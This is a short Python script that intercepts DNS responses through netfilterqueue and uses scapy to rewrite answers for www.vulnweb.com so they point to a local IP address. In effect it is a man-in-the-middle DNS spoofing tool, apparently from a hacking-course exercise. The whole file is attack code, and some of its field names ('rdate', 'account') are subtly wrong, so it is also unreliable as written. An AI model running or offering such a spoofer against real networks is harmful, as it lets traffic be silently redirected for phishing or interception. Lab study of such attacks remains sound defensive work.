import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.vulnweb.com" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname = qname, rdate = "192.168.1.5")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum


            packet.set_payload(bytes(scapy_packet))
        print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()

#0 is the queue number mentionned in iptables command
queue.bind(0, process_packet)

queue.run()